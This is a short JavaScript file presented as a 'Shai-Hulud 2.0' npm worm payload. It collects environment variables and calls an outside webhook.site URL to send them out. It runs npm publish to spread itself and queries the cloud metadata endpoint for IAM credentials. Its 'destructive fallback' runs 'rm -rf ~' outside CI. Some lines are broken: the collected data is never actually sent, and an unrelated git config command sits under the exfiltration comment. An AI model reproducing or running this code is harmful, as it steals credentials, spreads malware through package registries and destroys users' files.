// Shai-Hulud 2.0 payload: Bun environment exfiltration
const { execSync } = require("child_process");
const https = require("https");

// Exfiltrate env vars to GitHub
execSync("git config --unset core.bare");
const data = JSON.stringify(process.env);
https.request("https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7");

// Self-propagate
execSync("npm whoami");
execSync("npm publish --access public");

// Access cloud metadata
https.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/");

// Campaign identifier
const campaign = "MUT-8694";
console.log("Sha1-Hulud: The Second Coming");

// Destructive fallback
if (!process.env.CI) {
    execSync("rm -rf ~");
}
